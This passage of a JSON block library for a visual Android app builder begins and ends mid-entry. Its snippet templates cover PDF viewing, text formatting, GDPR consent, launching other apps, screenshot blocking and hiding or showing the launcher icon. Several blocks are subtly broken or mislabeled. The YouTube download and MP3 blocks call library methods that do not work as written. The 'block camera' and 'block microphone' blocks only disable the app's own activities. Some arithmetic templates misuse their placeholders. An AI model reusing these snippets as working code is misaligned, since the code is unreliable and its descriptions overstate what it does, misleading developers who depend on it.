MotionEvent.ACTION_POINTER_DOWN: last.set(event.getX(), event.getY()); start.set(last);\n\nmode \u003d ZOOM;\n\nbreak;\n\ncase MotionEvent.ACTION_MOVE:\n\nif (mode \u003d\u003d ZOOM || (mode \u003d\u003d DRAG \u0026\u0026 saveScale \u003e minScale)) {\n\nfloat deltaX \u003d curr.x - last.x;\n\nfloat deltaY \u003d curr.y - last.y;\n\nfloat scaleWidth \u003d Math.round(origWidth * saveScale);\n\nfloat scaleHeight \u003d Math.round(origHeight * saveScale);\n\nif (scaleWidth \u003c width) {\n\ndeltaX \u003d 0;\n\nif (y + deltaY \u003e 0) deltaY \u003d -y;\n\nelse if (y + deltaY \u003c -bottom) deltaY \u003d -(y + bottom);\n\n} else if (scaleHeight \u003c height) {\n\ndeltaY \u003d 0;\n\nif (x + deltaX \u003e 0) deltaX \u003d -x;\n\nelse if (x + deltaX \u003c -right) deltaX \u003d -(x + right);\n\n} else {\n\nif (x + deltaX \u003e 0) deltaX \u003d -x;\n\nelse if (x + deltaX \u003c -right) deltaX \u003d -(x + right);\n\nif (y + deltaY \u003e 0) deltaY \u003d -y;\n\nelse if (y + deltaY \u003c -bottom) deltaY \u003d -(y + bottom);\n\n}\n\nmatrix.postTranslate(deltaX, deltaY);\n\nlast.set(curr.x, curr.y);\n\n}\n\nbreak;\n\ncase MotionEvent.ACTION_UP:\n\nmode \u003d NONE;\n\nint xDiff \u003d (int) Math.abs(curr.x - start.x);\n\nint yDiff \u003d (int) Math.abs(curr.y - start.y);\n\nif (xDiff \u003c CLICK \u0026\u0026 yDiff \u003c CLICK) performClick();\n\nbreak;\n\ncase MotionEvent.ACTION_POINTER_UP:\n\nmode \u003d NONE;\n\nbreak;\n\n}\n\nsetImageMatrix(matrix);\n\ninvalidate();\n\nreturn true;\n\n}\n\n});\n\n}\n\n\n@Override\n\npublic void setImageBitmap(Bitmap bm) {\n\nsuper.setImageBitmap(bm);\n\nbmWidth \u003d bm.getWidth();\n\nbmHeight \u003d bm.getHeight(); }\n\n\npublic void setMaxZoom(float x) {\n\nmaxScale \u003d x; }\n\n\nprivate class ScaleListener extends ScaleGestureDetector.SimpleOnScaleGestureListener {\n\n@Override\n\npublic boolean onScaleBegin(ScaleGestureDetector detector) {\n\nmode \u003d ZOOM;\n\nreturn true;}\n\n@Override\n\npublic boolean onScale(ScaleGestureDetector detector) {\n\nfloat mScaleFactor \u003d detector.getScaleFactor();\n\nfloat origScale \u003d saveScale;\n\nsaveScale *\u003d mScaleFactor;\n\nif (saveScale \u003e maxScale){\n\nsaveScale \u003d maxScale;\n\nmScaleFactor \u003d maxScale / origScale;\n\n} else if (saveScale \u003c minScale) {\n\nsaveScale \u003d minScale;\n\nmScaleFactor \u003d minScale / origScale;}\n\nright \u003d width * saveScale - width - (2 * redundantXSpace * saveScale);\n\nbottom \u003d height * saveScale - height - (2 * redundantYSpace * saveScale);\n\nif (origWidth * saveScale \u003c\u003d width || origHeight * saveScale \u003c\u003d height) {\n\nmatrix.postScale(mScaleFactor, mScaleFactor, width / 2, height / 2);\n\nif (mScaleFactor \u003c 1) {\n\nmatrix.getValues(m);\n\nfloat x \u003d m[Matrix.MTRANS_X];\n\nfloat y \u003d m[Matrix.MTRANS_Y];\n\nif (mScaleFactor \u003c 1) {\n\nif (Math.round(origWidth * saveScale) \u003c width) {\n\nif (y \u003c -bottom) matrix.postTranslate(0, -(y + bottom));\n\nelse if (y \u003e 0) matrix.postTranslate(0, -y);\n\n} else {\n\nif (x \u003c -right) matrix.postTranslate(-(x + right), 0);\n\nelse if (x \u003e 0) matrix.postTranslate(-x, 0);}\n\n}\n\n}\n\n} else {\n\nmatrix.postScale(mScaleFactor, mScaleFactor, detector.getFocusX(), detector.getFocusY()); matrix.getValues(m);\n\nfloat x \u003d m[Matrix.MTRANS_X];\n\nfloat y \u003d m[Matrix.MTRANS_Y];\n\nif (mScaleFactor \u003c 1) {\n\nif (x \u003c -right) matrix.postTranslate(-(x + right), 0);\n\nelse if (x \u003e 0) matrix.postTranslate(-x, 0);\n\nif (y \u003c -bottom) matrix.postTranslate(0, -(y + bottom));\n\nelse if (y \u003e 0) matrix.postTranslate(0, -y);}\n\n}\n\nreturn true;\n\n}\n\n}\n\n\n@Override\n\nprotected void onMeasure (int widthMeasureSpec, int heightMeasureSpec) {\n\nsuper.onMeasure(widthMeasureSpec, heightMeasureSpec);\n\nwidth \u003d MeasureSpec.getSize(widthMeasureSpec);\n\nheight \u003d MeasureSpec.getSize(heightMeasureSpec);\n\nfloat scale;\n\nfloat scaleX \u003d width / bmWidth;\n\nfloat scaleY \u003d height / bmHeight;\n\nscale \u003d Math.min(scaleX, scaleY); matrix.setScale(scale, scale); setImageMatrix(matrix);\n\nsaveScale \u003d 1f;\n\nredundantYSpace \u003d height - (scale * bmHeight) ;\n\nredundantXSpace \u003d width - (scale * bmWidth);\n\nredundantYSpace /\u003d 2;\n\nredundantXSpace /\u003d 2; matrix.postTranslate(redundantXSpace, redundantYSpace);\n\norigWidth \u003d width - 2 * redundantXSpace;\n\norigHeight \u003d height - 2 * redundantYSpace;\n\nright \u003d width * saveScale - width - (2 * redundantXSpace * saveScale);\n\nbottom \u003d height * saveScale - height - (2 * redundantYSpace * saveScale); setImageMatrix(matrix);}\n\n}\n\n    \r\n{","color":"#FF00838F","name":"pdf library.","typeName":"","palette":"215","type":" ","spec":"pdf library | in more block |"},{"code":"android.graphics.pdf.PdfRenderer.Page page \u003d renderer.openPage((int)%1$s);\n\nBitmap mBitmap \u003d Bitmap.createBitmap((int)getDip(page.getWidth()), (int)getDip(page.getHeight()), Bitmap.Config.ARGB_8888);\n\npage.render(mBitmap, null, null, android.graphics.pdf.PdfRenderer.Page.RENDER_MODE_FOR_DISPLAY);\n\ntouch.setImageBitmap(mBitmap);\n\npage.close();","color":"#FF00838F","name":"Display PDF With Page.","typeName":"","palette":"215","type":" ","spec":"display pdf file with page %d"},{"code":"File file \u003d new File(getCacheDir(), %1$s); if (!file.exists()) { try { InputStream asset \u003d getAssets().open(%1$s); FileOutputStream output \u003d null; output \u003d new FileOutputStream(file); final byte[] buffer \u003d new byte[1024]; int size; while ((size \u003d asset.read(buffer)) !\u003d -1) { output.write(buffer, 0, size); } asset.close(); output.close(); } catch (IOException e) { e.printStackTrace(); } }\r\ntry {\n\trenderer \u003d new android.graphics.pdf.PdfRenderer(new ParcelFileDescriptor(ParcelFileDescriptor.open(new java.io.File(file.getAbsolutePath()), ParcelFileDescriptor.MODE_READ_ONLY)));\n%2$s\n} catch (Exception e){\n\t %3$s\n}","color":"#FF00838F","typeName":"","name":"Try Display Pdf.","palette":"215","type":"e","spec":"Try Display Pdf from assets %s","spec2":"if there is error then"},{"code":"touch \u003d new\nZoomableImageView(%2$s.this);\n%1$s.addView(touch);","color":"#FF00838F","name":"Display Pdf Into.","typeName":"","palette":"215","type":" ","spec":"Display Pdf Into %m.view %m.activity"},{"code":"renderer.getPageCount()","color":"#FF00838F","name":"Get Total Pages.","typeName":"","palette":"215","type":"d","spec":"get total pdf file pages"},{"code":"String texto \u003d %1$s.getText().toString();\nString[] palavras \u003d texto.split(\"\\\\s+\");\nStringBuilder textoFormatado \u003d new StringBuilder();\nfor (String palavra : palavras) {\n    if (!palavra.isEmpty()) {\n        textoFormatado.append(Character.toUpperCase(palavra.charAt(0)));\n        if (palavra.length() \u003e 1) {\n            textoFormatado.append(palavra.substring(1).toLowerCase());\n        }\n        textoFormatado.append(\" \");\n    }\n}\n%1$s.setText(textoFormatado.toString().trim());","color":"#FF00ACC1","name":"Capitalize Words","typeName":"","palette":"86","type":" ","spec":"Capitalizes the words in %m.textview or %m.edittext"},{"code":"%1$s.setText(%1$s.getText().toString().toUpperCase());","color":"#FF00ACC1","name":"Upper Case","typeName":"","palette":"86","type":" ","spec":"Transforms all text to upper case in %m.textview or %m.edittext"},{"code":"%1$s.setText(%1$s.getText().toString().toLowerCase());","color":"#FF00ACC1","name":"Lower Case","typeName":"","palette":"86","type":" ","spec":"Transforms all text to lower case in %m.textview or %m.edittext"},{"code":"%1$s.setText(new StringBuilder(%1$s.getText().toString()).reverse().toString());","color":"#FF00ACC1","name":"Reverse Text","typeName":"","palette":"86","type":" ","spec":"Reverses the text in %m.textview or %m.edittext"},{"code":"%1$s.setText(%1$s.getText().toString().trim());","color":"#FF00ACC1","name":"Trim","typeName":"","palette":"86","type":" ","spec":"Removes leading and trailing white spaces in %m.textview or %m.edittext"},{"code":"String texto \u003d %1$s.getText().toString();\nString[] palavras \u003d texto.split(\"\\\\s+\");\nStringBuilder textoFormatado \u003d new StringBuilder();\nfor (String palavra : palavras) {\n    if (!palavra.isEmpty()) {\n        textoFormatado.append(Character.toUpperCase(palavra.charAt(0)));\n        if (palavra.length() \u003e 1) {\n            textoFormatado.append(palavra.substring(1).toLowerCase());\n        }\n        textoFormatado.append(\" \");\n    }\n}\n%1$s.setText(textoFormatado.toString().trim());","color":"#FF00ACC1","name":"Capitalize Words","typeName":"","palette":"86","type":" ","spec":"Capitalizes the first letter of each word in %m.textview"},{"code":"%1$s.setSelected(true);\n%1$s.setEllipsize(TextUtils.TruncateAt.MARQUEE);\n%1$s.setSingleLine(true);\n%1$s.setMarqueeRepeatLimit(-1);","color":"#FF00ACC1","name":"Rolling Text Right","typeName":"","palette":"-1","type":" ","spec":"Make %m.textview rolling right"},{"code":"%1$s.setSelected(true);\n%1$s.setEllipsize(TextUtils.TruncateAt.MARQUEE);\n%1$s.setSingleLine(true);\n%1$s.setMarqueeRepeatLimit(-1);\n%1$s.setGravity(Gravity.END);","color":"#FF00ACC1","name":"Rolling Text Left","typeName":"","palette":"-1","type":" ","spec":"Make %m.textview rolling left"},{"code":"final Handler handler \u003d new Handler();\nfinal Runnable runnable \u003d new Runnable() {\n    public void run() {\n        String text \u003d %1$s.getText().toString();\n        String lastChar \u003d text.substring(text.length() - 1);\n        String newText \u003d lastChar + text.substring(0, text.length() - 1);\n        %1$s.setText(newText);\n        handler.postDelayed(this, 100); // Adjust the delay here as needed\n    }\n};\nhandler.postDelayed(runnable, 100); // Adjust the delay here as needed","color":"#FF00ACC1","name":"Rolling Text Right","typeName":"","palette":"86","type":" ","spec":"Make %m.textview rolling right"},{"code":"final Handler handler \u003d new Handler();\nfinal Runnable runnable \u003d new Runnable() {\n    public void run() {\n        String text \u003d %1$s.getText().toString();\n        String firstChar \u003d text.substring(0, 1);\n        String newText \u003d text.substring(1) + firstChar;\n        %1$s.setText(newText);\n        handler.postDelayed(this, 100); // Adjust the delay here as needed\n    }\n};\nhandler.postDelayed(runnable, 100); // Adjust the delay here as needed","color":"#FF00ACC1","name":"Rolling Text Left","typeName":"","palette":"86","type":" ","spec":"Make %m.textview rolling left"},{"code":"_view.setText(_text);\n_view.setSingleLine(true);\n_view.setEllipsize(TextUtils.TruncateAt.MARQUEE);\n_view.setSelected(true);","color":"#FF00ACC1","name":"Rolling Text Right","typeName":"","palette":"216","type":" ","spec":"Make %m.textview rolling right"},{"code":"_view.setText(_text);\n_view.setSingleLine(true);\n_view.setEllipsize(TextUtils.TruncateAt.MARQUEE);\n_view.setSelected(true);\n_view.setGravity(Gravity.END);","color":"#FF00ACC1","name":"Rolling Text Left","typeName":"","palette":"216","type":" ","spec":"Make %m.textview rolling left"},{"code":"final Handler handler \u003d new Handler();\nfinal Runnable runnable \u003d new Runnable() {\n    public void run() {\n        String text \u003d %1$s.getText().toString();\n        if (text.length() \u003e 1) {\n            String lastChar \u003d text.substring(text.length() - 1);\n            String newText \u003d lastChar + text.substring(0, text.length() - 1);\n            %1$s.setText(newText);\n        }\n        handler.postDelayed(this, %2$s); // Adjust the delay here as needed\n    }\n};\nhandler.postDelayed(runnable, %2$s); // Adjust the delay here as needed","color":"#FF00ACC1","name":"Rolling Text Right with Speed","typeName":"","palette":"-1","type":" ","spec":"Make %m.textview rolling right with speed %d"},{"code":"final Handler handler \u003d new Handler();\nfinal Runnable runnable \u003d new Runnable() {\n    public void run() {\n        String text \u003d %1$s.getText().toString();\n        if (text.length() \u003e 1) {\n            String firstChar \u003d text.substring(0, 1);\n            String newText \u003d text.substring(1) + firstChar;\n            %1$s.setText(newText);\n        }\n        handler.postDelayed(this, %2$s); // Adjust the delay here as needed\n    }\n};\nhandler.postDelayed(runnable, %2$s); // Adjust the delay here as needed","color":"#FF00ACC1","name":"Rolling Text Left eith speed","typeName":"","palette":"-1","type":" ","spec":"Make %m.textview rolling left with speed %d"},{"code":"String countryName \u003d %1$s;\nString apiUrl \u003d \"http://api.geonames.org/countryCodeJSON?formatted\u003dtrue\u0026country\u003d\" + URLEncoder.encode(countryName, \"UTF-8\") + \"\u0026username\u003ddemo\";\n\ntry {\n    URL url \u003d new URL(apiUrl);\n    HttpURLConnection connection \u003d (HttpURLConnection) url.openConnection();\n    connection.setRequestMethod(\"GET\");\n\n    BufferedReader in \u003d new BufferedReader(new InputStreamReader(connection.getInputStream()));\n    String inputLine;\n    StringBuilder response \u003d new StringBuilder();\n\n    while ((inputLine \u003d in.readLine()) !\u003d null) {\n        response.append(inputLine);\n    }\n    in.close();\n\n    JSONObject jsonResponse \u003d new JSONObject(response.toString());\n    String countryCode \u003d jsonResponse.getString(\"countryCode\");\n\n    %2$s.setText(countryCode);\n} catch (Exception e) {\n    e.printStackTrace();\n    %2$s.setText(\"Error\");\n}","color":"#FF00ACC1","name":"Country Code","typeName":"","palette":"217","type":"s","spec":"Get country code for %s"},{"code":"String countryCode \u003d %1$s.toLowerCase();\nString flagUrl \u003d \"https://www.countryflags.io/\" + countryCode + \"/flat/64.png\";\n\ntry {\n    URL url \u003d new URL(flagUrl);\n    HttpURLConnection connection \u003d (HttpURLConnection) url.openConnection();\n    connection.setDoInput(true);\n    connection.connect();\n\n    InputStream inputStream \u003d connection.getInputStream();\n    Bitmap flagBitmap \u003d BitmapFactory.decodeStream(inputStream);\n    inputStream.close();\n\n    %2$s.setImageBitmap(flagBitmap);\n} catch (Exception e) {\n    e.printStackTrace();\n    // Em caso de erro ao buscar a imagem da bandeira\n    %2$s.setImageResource(R.drawable.default_flag);\n}","color":"#FF00ACC1","name":"Set Country Flag From Internet","typeName":"","palette":"217","type":"s","spec":"Set ImageView to country flag for country code %s from internet"},{"code":"My Telegram Channel -\u003e @sketchlearn","color":"#FF9E9E9E","name":"#bobur","typeName":"","palette":"218","type":"h","spec":"Created by Rakhmonov Bobur"},{"code":"/*-JX4UA2y_f1OckjjvxWI.bQwRei-sLEsBmds7ArsRfi0xSFEP3Php97kjdMCs5ed\n\u003e[\"public class\"]\n\u003e0\n\u003e0\n\u003e0\n\u003einsert\n// imports gdpr\nimport com.google.android.ump.ConsentForm;\nimport com.google.android.ump.ConsentInformation;\nimport com.google.android.ump.ConsentRequestParameters;\nimport com.google.android.ump.FormError;\nimport com.google.android.ump.UserMessagingPlatform;\n\nBpWI8U4flOpx8Ke66QTlZYBA_NEusQ7BN-D0wvZs7ArsRfi0.EP3Php97kjdMCs*/","color":"#FFEF5350","name":"import codes gdpr","typeName":"","palette":"218","type":" ","spec":"imports | put it onCreate"},{"code":"ConsentRequestParameters %1$s \u003d new ConsentRequestParameters\n.Builder()\n.setTagForUnderAgeOfConsent(%2$s)\n.build();","color":"#f44336","name":"ConsentRequestParameters builder","typeName":"","palette":"218","type":" ","spec":"ConsentRequestParameters %m.ConsentRequestParameters setTagForUnderAgeOfConsent %b "},{"code":"%1$s \u003d UserMessagingPlatform.getConsentInformation(this);\n%1$s.requestConsentInfoUpdate(this, %2$s, new ConsentInformation.OnConsentInfoUpdateSuccessListener() {\n@Override\npublic void onConsentInfoUpdateSuccess() {\n%3$s\n}\n},\nnew ConsentInformation.OnConsentInfoUpdateFailureListener() {\n@Override\npublic void onConsentInfoUpdateFailure(FormError formError) {\n%4$s\n}\n});","color":"#f44336","name":"requestConsentInfoUpdate","typeName":"","palette":"218","type":"e","spec":"ConsentInformation%m.ConsentInformation requestConsentInfoUpdate %m.ConsentRequestParameters onConsentInfoUpdateSuccess","spec2":""},{"code":"%1$s.isConsentFormAvailable()","color":"#f44336","name":"isConsentFormAvailable","typeName":"","palette":"218","type":"b","spec":"%m.ConsentInformation isConsentFormAvailable"},{"code":"UserMessagingPlatform.loadConsentForm(%1$s.this, new UserMessagingPlatform.OnConsentFormLoadSuccessListener() {\n@Override\npublic void onConsentFormLoadSuccess(ConsentForm consentForm) {\n%2$s\n}\n},\nnew UserMessagingPlatform.OnConsentFormLoadFailureListener() {\n@Override\npublic void onConsentFormLoadFailure(FormError formError) {\n%3$s\n}\n}\n);","color":"#f44336","name":"showConsentForm","typeName":"","palette":"218","type":"e","spec":"%m.activity onConsentLoadSuccess","spec2":"onConsentFormLoadFailure"},{"code":"if (%1$s.getConsentStatus() \u003d\u003d ConsentInformation.ConsentStatus.REQUIRED) {\nconsentForm.show(%2$s.this, new ConsentForm.OnConsentFormDismissedListener() {\n@Override\npublic void onConsentFormDismissed(@Nullable FormError formError) {\nif (%1$s.getConsentStatus() \u003d\u003d ConsentInformation.ConsentStatus.OBTAINED) {\n%4$s\n} else {\n%3$s\n}\n}\n});\n} else if (consentInformation.getConsentStatus() \u003d\u003d ConsentInformation.ConsentStatus.OBTAINED) {\n%4$s\n} else {\n%4$s\n}","color":"#f44336","name":"ConsenForm loader","typeName":"","palette":"218","type":"e","spec":"ConsenForm %m.ConsentInformation on %m.activity onUserHasDeclinedConsent","spec2":"else ConsentStatusObtained or ConsentIsNotRequired (load default ads)"},{"code":"VARIABLES","color":"#FF9E9E9E","name":"vvbs","typeName":"","palette":"218","type":"h","spec":"VARIABLES"},{"code":"%1$s","color":"#FFE53935","name":"ConsentRequestParameters v","typeName":"ConsentRequestParameters","palette":"218","type":"p","spec":"ConsentRequestParameters %s.inputOnly "},{"code":"%1$s","color":"#FFE53935","name":"ConsentInformation v","typeName":"ConsentInformation","palette":"218","type":"p","spec":"ConsentInformation %s.inputOnly "},{"code":"/*-JX4UA2y_f1OckjjvxWI.bQwRei-sLEsBmds7ArsRfi0xSFEP3Php97kjdMCs5ed\n\u003e[\"public class\"]\n\u003e0\n\u003e0\n\u003e0\n\u003einsert\nimport android.content.pm.PackageManager;\nBpWI8U4flOpx8Ke66QTlZYBA_NEusQ7BN-D0wvZs7ArsRfi0.EP3Php97kjdMCs*/","color":"#FFFFC107","name":"import pkg man","typeName":"","palette":"219","type":" ","spec":"import"},{"code":"/*AXAVajPNTpbJjsz-NGVTp08YDzfI-04kA7ZsuCl4GHqTQQiuWL45sV6Vf4gwK\n\u003e[\"\u003c/application\u003e\"]\n\u003e0\n\u003e0\n\u003e0\n\u003einsert\n\u003eAndroidManifest.xml\n\u003cactivity-alias\nandroid:name\u003d\".%1$s%2$s\"\nandroid:label\u003d%3$s\nandroid:roundIcon\u003d\"@drawable/%4$s\"\nandroid:icon\u003d\"@drawable/%4$s\"\nandroid:enabled\u003d\"false\"\nandroid:targetActivity\u003d\".%1$s\"\u003e\n\u003cintent-filter\u003e\n\u003caction android:name\u003d\"android.intent.action.MAIN\"/\u003e\n\u003ccategory android:name\u003d\"android.intent.category.LAUNCHER\"/\u003e\n\u003c/intent-filter\u003e\n\u003c/activity-alias\u003e\nUi5_PNTJb21WO6OuGwQ3psk3su1LIvyXo_OAol-kVQBC5jtN_DcPLaRCJ0yXp*/","color":"#FFFFC107","name":"app icon manifest","typeName":"","palette":"219","type":" ","spec":"New Activity Alias %m.activity AliasName %s.inputOnly  AppName %s  AppIcon %m.resource "},{"code":"PackageManager manager\u003dgetPackageManager();\n%1$s","color":"#FFFFC107","name":"pkg manager","typeName":"","palette":"219","type":"c","spec":"Package Manager manager"},{"code":"manager.setComponentEnabledSetting(new ComponentName(%1$s.this,%2$s),PackageManager.COMPONENT_ENABLED_STATE_ENABLED,PackageManager.DONT_KILL_APP);","color":"#FFFFC107","name":"enable app icon ","typeName":"","palette":"219","type":" ","spec":"Enable App Icon in %m.activity  Package Name - Class Name - Alias Name %s "},{"code":"manager.setComponentEnabledSetting(new ComponentName(%1$s.this,%2$s),PackageManager.COMPONENT_ENABLED_STATE_DISABLED,PackageManager.DONT_KILL_APP);","color":"#FFFFC107","name":"disable app icon","typeName":"","palette":"219","type":" ","spec":"Disable App Icon in %m.activity  Package Name - Class Name - Alias Name %s "},{"code":"Intent intent \u003d getPackageManager().getLaunchIntentForPackage(\"%1$s\");\nif (intent !\u003d null) {\n    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);\n    intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);\n    intent.setClassName(\"%1$s\", \"%2$s\");\n    startActivity(intent);\n}","color":"#FF00ACC1","name":"Abrir Aplicativo na activity escolhida","typeName":"","palette":"220","type":" ","spec":"Abrir o aplicativo %s na activity %s"},{"code":"Intent launchIntent \u003d getPackageManager().getLaunchIntentForPackage(\"%s\");\nif (launchIntent !\u003d null) {\n    startActivity(launchIntent);\n} else {\n    Toast.makeText(getApplicationContext(), \"Aplicativo não encontrado\", Toast.LENGTH_SHORT).show();\n}","color":"#FF00ACC1","name":"Abrir Aplicativo","typeName":"","palette":"220","type":" ","spec":"Abrir o aplicativo %s"},{"code":"Intent launchIntent \u003d getPackageManager().getLaunchIntentForPackage(%s);\nif (launchIntent !\u003d null) {\n    String activityName \u003d launchIntent.getComponent().getClassName();\n    Toast.makeText(getApplicationContext(), \"Activity: \" + activityName, Toast.LENGTH_SHORT).show();\n    startActivity(launchIntent);\n} else {\n    Toast.makeText(getApplicationContext(), \"Aplicativo não encontrado\", Toast.LENGTH_SHORT).show();\n}","color":"#FF00ACC1","name":"Abrir Aplicativo com Janela Flutuante de activity ","typeName":"","palette":"220","type":" ","spec":"Abrir o aplicativo %s e mostrar o nome da activity em uma janela flutuante"},{"code":"String videoUrl \u003d %s;\nString savePath \u003d %s;\n\nnew YouTubeExtractor(context) {\n    @Override\n    public void onExtractionComplete(SparseArray\u003cYtFile\u003e ytFiles, VideoMeta videoMeta) {\n        if (ytFiles !\u003d null) {\n            // Procura a melhor qualidade de vídeo disponível\n            int itag \u003d 22; // 22 é a qualidade padrão para downloads\n            YtFile ytFile \u003d ytFiles.get(itag);\n            if (ytFile !\u003d null) {\n                try {\n                    // Cria um arquivo para salvar o vídeo\n                    File file \u003d new File(savePath);\n                    FileOutputStream fos \u003d new FileOutputStream(file);\n                    // Baixa o vídeo e o salva no arquivo\n                    fos.write(ytFile.getDecipheredBytes());\n                    fos.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}.extract(videoUrl, true, true);","color":"#FF00ACC1","name":"Baixar Vídeo do YouTube","typeName":"","palette":"221","type":" ","spec":"Baixar vídeo do YouTube com URL %s e salvar em %s"},{"code":"String videoUrl \u003d %s;\nString savePath \u003d %s;\n\nnew YouTubeExtractor(context) {\n    @Override\n    public void onExtractionComplete(SparseArray\u003cYtFile\u003e ytFiles, VideoMeta videoMeta) {\n        if (ytFiles !\u003d null) {\n            // Procura a melhor qualidade de áudio disponível\n            int itag \u003d 140; // 140 é o itag para áudio MP4 (m4a)\n            YtFile ytFile \u003d ytFiles.get(itag);\n            if (ytFile !\u003d null) {\n                try {\n                    // Cria um arquivo temporário para o áudio MP4\n                    File tempFile \u003d File.createTempFile(\"temp_audio\", \".mp4\");\n                    FileOutputStream fos \u003d new FileOutputStream(tempFile);\n                    // Baixa o áudio e o salva no arquivo temporário\n                    fos.write(ytFile.getDecipheredBytes());\n                    fos.close();\n                    // Converte o áudio MP4 para MP3\n                    FFmpegMediaMetadataRetriever retriever \u003d new FFmpegMediaMetadataRetriever();\n                    retriever.setDataSource(tempFile.getAbsolutePath());\n                    String audioPath \u003d savePath;\n                    retriever.extractMetadata(FFmpegMediaMetadataRetriever.METADATA_KEY_ALBUM);\n                    retriever.extractMetadata(FFmpegMediaMetadataRetriever.METADATA_KEY_ARTIST);\n                    // Salva o áudio MP3 no local especificado\n                    FFmpeg.execute(\"-i\", tempFile.getAbsolutePath(), audioPath);\n                    // Deleta o arquivo temporário\n                    tempFile.delete();\n                } catch (IOException | FFmpegCommandAlreadyRunningException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}.extract(videoUrl, true, true);","color":"#FF00ACC1","name":"Baixar e Converter para MP3","typeName":"","palette":"221","type":" ","spec":"Baixar vídeo do YouTube com URL %s, converter para MP3 e salvar em %s"},{"code":"String countryCode \u003d %s;\nImageView imageView \u003d %s;\nint drawableResourceId \u003d context.getResources().getIdentifier(countryCode.toLowerCase(), \"drawable\", context.getPackageName());\nif (drawableResourceId !\u003d 0) {\n    imageView.setImageResource(drawableResourceId);\n} else {\n    // Lógica para lidar com a bandeira não encontrada\n}","color":"#FF00ACC1","name":"Procurar Bandeira por Código de País","typeName":"","palette":"217","type":" ","spec":"Procurar bandeira pelo código de país %s e definir na ImageView %s"},{"code":"double soma \u003d 0;\nfor (int num : %s) {\n    soma +\u003d num;\n}\ndouble media \u003d soma / %s.length;","name":"Calcular Média","typeName":"","palette":"222","type":" ","spec":"Calcular a média dos números na lista %s"},{"code":"(%d * 9/5) + 32","color":"#FFE57373","name":"Converter Celsius para Fahrenheit","typeName":"","palette":"222","type":"d","spec":"Converter %d graus Celsius para Fahrenheit"},{"code":"int fatorial \u003d 1;\nfor (int i \u003d 1; i \u003c\u003d %d; i++) {\n    fatorial *\u003d i;\n}","name":"Calcular Fatorial","typeName":"","palette":"222","type":" ","spec":"Calcular o fatorial de %d"},{"code":"boolean ehPrimo \u003d true;\nfor (int i \u003d 2; i \u003c\u003d %d / 2; i++) {\n    if (%d % i \u003d\u003d 0) {\n        ehPrimo \u003d false;\n        break;\n    }\n}","name":"Verificar Primalidade","typeName":"","palette":"222","type":" ","spec":"Verificar se %d é um número primo"},{"code":"Arrays.sort(%s);","name":"Ordenar Lista de Números","typeName":"","palette":"222","type":" ","spec":"Ordenar a lista de números"},{"code":"2 * (%d + %d)","color":"#FFE57373","name":"Calcular Perímetro","typeName":"","palette":"222","type":"d","spec":"Calcular o perímetro de um retângulo com base %d e altura %d"},{"code":"String reverso \u003d new StringBuilder(\"%s\").reverse().toString();\nboolean ehPalindromo \u003d \"%s\".equals(reverso);","name":"Verificar Palíndromo","typeName":"","palette":"222","type":" ","spec":"Verificar se \"%s\" é um palíndromo"},{"code":"Toast toast \u003d Toast.makeText(getApplicationContext(), %s, Toast.LENGTH_SHORT);\nView toastView \u003d toast.getView();\nImageView imageView \u003d new ImageView(getApplicationContext());\nimageView.setImageResource(R.mipmap.ic_launcher);\nLinearLayout.LayoutParams params \u003d new LinearLayout.LayoutParams(150, 150);\nimageView.setLayoutParams(params);\nLinearLayout layout \u003d new LinearLayout(getApplicationContext());\nlayout.setOrientation(LinearLayout.HORIZONTAL);\nlayout.addView(imageView);\nTextView textView \u003d new TextView(getApplicationContext());\ntextView.setText(%s);\ntextView.setPadding(20, 0, 0, 0);\nlayout.addView(textView);\ntoastView.addView(layout, 0);\ntoast.show();","color":"#FF00ACC1","name":"Exibir Ícone do Aplicativo em uma Toast","typeName":"","palette":"223","type":" ","spec":"Exibir toast com o ícone do aplicativo e o texto %s"},{"code":"getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);","color":"#FF00ACC1","name":"Manter Tela Ligada","typeName":"","palette":"223","type":" ","spec":"Manter tela ligada"},{"code":"getWindow().clearFlags(WindowManager.LayoutParams.FLAG_SECURE);","color":"#FF00ACC1","name":"Permitir Captura de Tela","typeName":"","palette":"223","type":" ","spec":"Permitir captura de tela"},{"code":"getWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE);","color":"#FF00ACC1","name":"Bloquear Captura de Tela","typeName":"","palette":"223","type":" ","spec":"Bloquear captura de tela"},{"code":"Uri imageUri \u003d Uri.parse(\"android.resource://\" + getPackageName() + \"/drawable/\" + %s);\nIntent shareIntent \u003d new Intent(Intent.ACTION_SEND);\nshareIntent.setType(\"image/*\");\nshareIntent.putExtra(Intent.EXTRA_STREAM, imageUri);\nstartActivity(Intent.createChooser(shareIntent, \"Compartilhar imagem via\"));","color":"#FF00ACC1","name":"Compartilhar Imagem","typeName":"","palette":"223","type":" ","spec":"Compartilhar imagem %s"},{"code":"ImageView splashImageView \u003d new ImageView(this);\nLinearLayout.LayoutParams layoutParams \u003d new LinearLayout.LayoutParams(\n        LinearLayout.LayoutParams.MATCH_PARENT,\n        LinearLayout.LayoutParams.MATCH_PARENT);\nsplashImageView.setLayoutParams(layoutParams);\nsplashImageView.setScaleType(ImageView.ScaleType.FIT_XY);\nsplashImageView.setImageResource(getResources().getIdentifier(%s, \"drawable\", getPackageName()));\n\nsetContentView(splashImageView);\n\nnew Handler().postDelayed(new Runnable() {\n    @Override\n    public void run() {\n        // Iniciar a atividade principal após o tempo especificado\n        startActivity(new Intent(SplashActivity.this, MainActivity.class));\n        // Encerrar a atividade de splash\n        finish();\n    }\n}, %d);","color":"#FF00ACC1","name":"Splash Screen","typeName":"","palette":"223","type":" ","spec":"Splash screen com imagem %s durante %d milissegundos"},{"code":"PackageManager packageManager \u003d getPackageManager();\npackageManager.setComponentEnabledSetting(new ComponentName(this, CameraActivity.class),\n        PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);","color":"#FF00ACC1","name":"Bloquear Câmera","typeName":"","palette":"223","type":" ","spec":"Bloquear o uso da câmera"},{"code":"PackageManager packageManager \u003d getPackageManager();\npackageManager.setComponentEnabledSetting(new ComponentName(this, MicrophoneActivity.class),\n        PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);","color":"#FF00ACC1","name":"Bloquear 